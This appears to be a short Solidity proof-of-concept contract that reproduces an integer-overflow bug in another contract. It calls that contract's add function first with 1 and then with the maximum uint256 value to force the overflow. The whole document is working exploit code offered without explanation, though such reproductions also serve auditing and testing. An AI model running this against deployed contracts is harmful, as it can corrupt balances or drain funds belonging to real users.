

interface IOverflow {
    function add(uint value) external returns (bool);
}

contract Reproduction is IOverflow {
    IOverflow public vulnerableContract;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = IOverflow(_vulnerableContract);
    }
    
    function setup() public {
        vulnerableContract.add(1);
    }
    
    function triggerVulnerability() public {
        uint256 largeValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        vulnerableContract.add(largeValue);
    }
    
    function add(uint value) external override returns (bool) {
        return true;
    }
}